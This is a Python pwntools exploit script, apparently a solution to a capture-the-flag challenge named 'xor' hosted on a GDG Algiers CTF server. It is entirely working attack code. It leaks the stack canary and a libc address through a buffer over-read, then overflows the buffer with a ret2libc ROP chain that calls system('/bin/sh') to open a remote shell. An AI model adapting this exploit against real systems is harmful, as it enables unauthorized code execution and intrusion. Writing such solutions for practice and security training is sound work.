#!/usr/bin/python3

from pwn import *

exe = ELF('./xor', checksec=False)
libc = ELF('./lib/libc.so.6', checksec=False)

context.binary = exe

# p = process(exe.path)
p = remote('pwn.chal.ctf.gdgalgiers.com', 1400)

size = 0x100
payload = flat(
	b'A'*127,
	b'y',        # answer
	b'A'*24,
	size,        # size
	)
p.sendafter(b'name: ', payload)

###########################################
### Stage 1: Leak canary & libc address ###
###########################################
p.sendafter(b'Choice: ', b'4')
p.recvuntil(b'Buffer: ')
p.recv(0x88 - 48)
canary = u64(p.recv(8))
p.recv(40)
log.info("Canary leak: " + hex(canary))

libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x29d90
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))

#########################
### Stage 2: Ret2libc ###
#########################
pop_rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029cd6
p.sendafter(b'Choice: ', b'1')
payload = flat(
	cyclic(cyclic_find('waaa')),
	canary,
	0,
	ret,
	pop_rdi, next(libc.search(b'/bin/sh')),
	libc.sym['system'],
	)
p.sendafter(b'bytes: ', payload)

p.sendafter(b'Choice: ', b'0')
p.interactive()